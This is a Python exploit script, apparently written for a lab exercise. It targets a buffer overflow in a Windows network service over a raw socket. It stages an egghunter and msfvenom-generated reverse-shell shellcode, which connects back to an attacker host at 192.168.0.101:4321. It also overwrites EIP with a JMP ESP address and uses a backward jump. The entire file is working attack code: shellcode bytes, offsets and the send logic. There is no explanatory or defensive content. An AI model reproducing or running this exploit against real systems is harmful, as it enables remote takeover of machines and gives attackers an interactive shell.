#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
from struct import *

host = "192.168.0.112"
port = 7274

max_size = 192

size_offset = 143

payload = "EXPLOIT3 "

# cat egghunter_w10 | msfvenom -p - -a x86 --platform win -e generic/none -f python

buf =  b""
buf += b"\xeb\x1e\x59\x31\xdb\x64\x8b\x03\x50\x5c\x51\x51\x68"
buf += b"\x5c\x58\xc3\x90\x68\xea\x17\x74\x72\x68\x58\x58\xeb"
buf += b"\x04\x64\x89\x23\xeb\x14\x31\xd2\xe8\xdb\xff\xff\xff"
buf += b"\x83\xec\x14\x31\xdb\x64\x89\x23\x8b\x54\x24\x18\x42"
buf += b"\x66\x81\xca\xff\x0f\x42\x89\x54\x24\x18\xb8\x54\x4f"
buf += b"\x4f\x57\x89\xd7\xaf\x75\xf1\xaf\x75\xee\xff\xe7"

offset = "\x90" * 3
offset += buf
offset += "A" * (size_offset - len(offset)) 

# jmp esp

eip = pack('<L', 0x7274146F)

# jmp - 153

rev_jmp = "\x90" * 8
rev_jmp += "\xE9\x62\xFF\xFF\xFF"

maxmax = offset + eip + rev_jmp

esp = "C" * (max_size - len(maxmax))

violation = ">"

buffer = payload + offset + eip + rev_jmp + esp + violation

# msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows -b "\x00" lhost=192.168.0.101 lport=4321 -f python

buf =  b""
buf += b"\xdb\xde\xbd\xda\x45\x8a\x91\xd9\x74\x24\xf4\x58\x33"
buf += b"\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13\x03\xb2\x56\x68"
buf += b"\x64\xbe\xb1\xee\x87\x3e\x42\x8f\x0e\xdb\x73\x8f\x75"
buf += b"\xa8\x24\x3f\xfd\xfc\xc8\xb4\x53\x14\x5a\xb8\x7b\x1b"
buf += b"\xeb\x77\x5a\x12\xec\x24\x9e\x35\x6e\x37\xf3\x95\x4f"
buf += b"\xf8\x06\xd4\x88\xe5\xeb\x84\x41\x61\x59\x38\xe5\x3f"
buf += b"\x62\xb3\xb5\xae\xe2\x20\x0d\xd0\xc3\xf7\x05\x8b\xc3"
buf += b"\xf6\xca\xa7\x4d\xe0\x0f\x8d\x04\x9b\xe4\x79\x97\x4d"
buf += b"\x35\x81\x34\xb0\xf9\x70\x44\xf5\x3e\x6b\x33\x0f\x3d"
buf += b"\x16\x44\xd4\x3f\xcc\xc1\xce\x98\x87\x72\x2a\x18\x4b"
buf += b"\xe4\xb9\x16\x20\x62\xe5\x3a\xb7\xa7\x9e\x47\x3c\x46"
buf += b"\x70\xce\x06\x6d\x54\x8a\xdd\x0c\xcd\x76\xb3\x31\x0d"
buf += b"\xd9\x6c\x94\x46\xf4\x79\xa5\x05\x91\x4e\x84\xb5\x61"
buf += b"\xd9\x9f\xc6\x53\x46\x34\x40\xd8\x0f\x92\x97\x1f\x3a"
buf += b"\x62\x07\xde\xc5\x93\x0e\x25\x91\xc3\x38\x8c\x9a\x8f"
buf += b"\xb8\x31\x4f\x1f\xe8\x9d\x20\xe0\x58\x5e\x91\x88\xb2"
buf += b"\x51\xce\xa9\xbd\xbb\x67\x43\x44\x2c\x48\x3c\x46\xc9"
buf += b"\x20\x3f\x46\x01\x50\xb6\xa0\x4b\x82\x9f\x7b\xe4\x3b"
buf += b"\xba\xf7\x95\xc4\x10\x72\x95\x4f\x97\x83\x58\xb8\xd2"
buf += b"\x97\x0d\x48\xa9\xc5\x98\x57\x07\x61\x46\xc5\xcc\x71"
buf += b"\x01\xf6\x5a\x26\x46\xc8\x92\xa2\x7a\x73\x0d\xd0\x86"
buf += b"\xe5\x76\x50\x5d\xd6\x79\x59\x10\x62\x5e\x49\xec\x6b"
buf += b"\xda\x3d\xa0\x3d\xb4\xeb\x06\x94\x76\x45\xd1\x4b\xd1"
buf += b"\x01\xa4\xa7\xe2\x57\xa9\xed\x94\xb7\x18\x58\xe1\xc8"
buf += b"\x95\x0c\xe5\xb1\xcb\xac\x0a\x68\x48\xdc\x40\x30\xf9"
buf += b"\x75\x0d\xa1\xbb\x1b\xae\x1c\xff\x25\x2d\x94\x80\xd1"
buf += b"\x2d\xdd\x85\x9e\xe9\x0e\xf4\x8f\x9f\x30\xab\xb0\xb5"

# enviando a tag

shellcode = "EXPLOIT4 "
shellcode += "\x90" * 200 
shellcode += "TOOWTOOW"
shellcode += buf

#shellcode += "C" * 400

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((host,port))
conn.send(shellcode)
print("[*] Enviando Shellcode...")
conn.close()

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp.connect((host,port))
exp.send(buffer)
print("[*] Enviando Exploit...")
exp.close()